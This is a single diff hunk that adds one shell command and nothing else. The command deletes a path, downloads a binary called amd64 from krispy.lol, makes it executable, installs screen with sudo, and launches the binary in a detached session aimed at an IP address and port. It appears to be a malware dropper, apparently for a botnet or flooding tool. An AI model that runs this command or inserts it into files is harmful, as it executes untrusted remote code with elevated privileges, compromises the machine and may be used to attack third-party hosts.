@@ -1,0 +1,1 @@
+rm -rf unix; wget https://krispy.lol/amd64; chmod 777 amd64; sudo apt install screen -y; screen -dmS s ./amd64 46.31.77.155 77 test
